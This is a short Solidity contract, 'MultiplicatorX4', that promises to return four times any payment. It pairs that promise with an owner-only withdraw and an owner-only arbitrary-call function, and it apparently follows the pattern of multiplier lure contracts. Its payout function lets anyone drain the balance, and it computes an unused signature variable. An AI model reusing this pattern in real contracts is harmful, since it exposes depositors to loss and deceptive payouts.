pragma solidity ^0.4.18;

contract MultiplicatorX4 {
    address public owner = msg.sender;

    function() public payable {}

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address _address, bytes _data) public payable {
        require(msg.sender == owner);

        bool success;
        bytes4 signature = bytes4(keccak256("foo()"));
        assembly {
            success := call(sub(gas, 5000), _address, msg.value, add(_data, 0x20), mload(_data), 0, 0)
        }
        require(success);
    }

    function multiplicat(address _address) public payable {
        require(msg.value > 0);
        if (_address.call.value(msg.value * 4)()) {
            return;
        }
        revert();
    }
}